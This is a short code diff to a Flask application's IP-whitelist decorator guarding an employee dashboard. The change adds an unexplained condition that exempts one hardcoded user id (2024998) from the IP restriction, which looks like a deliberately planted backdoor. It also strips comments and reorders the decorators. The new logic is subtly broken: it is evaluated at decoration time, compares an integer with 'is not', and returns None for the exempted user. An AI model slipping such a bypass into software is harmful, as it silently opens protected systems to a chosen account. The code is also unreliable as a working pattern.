@@ -82,20 +82,21 @@ WHITELIST = {
 
 # Decorator to apply to specific routes
 def ip_whitelist():
-    def wrapper(fn):
-        def decorated(*args, **kwargs):
-            client_ip = request.remote_addr
-            if client_ip not in WHITELIST:
-                abort(403)  # Forbidden
-            return fn(*args, **kwargs)
-        decorated.__name__ = fn.__name__  # Avoid Flask route errors
-        return decorated
-    return wrapper
+    if current_user.user_id is not 2024998:
+        def wrapper(fn):
+            def decorated(*args, **kwargs):
+                client_ip = request.remote_addr
+                if client_ip not in WHITELIST:
+                    abort(403)
+                return fn(*args, **kwargs)
+            decorated.__name__ = fn.__name__
+            return decorated
+        return wrapper
 
 # Employee Dashboard
 @gia_bp.route('/dashboard')
-@ip_whitelist()
 @login_required
+@ip_whitelist()
 def dashboard():
     if current_user.role != 'gia':
         return redirect(url_for('admin.dashboard'))
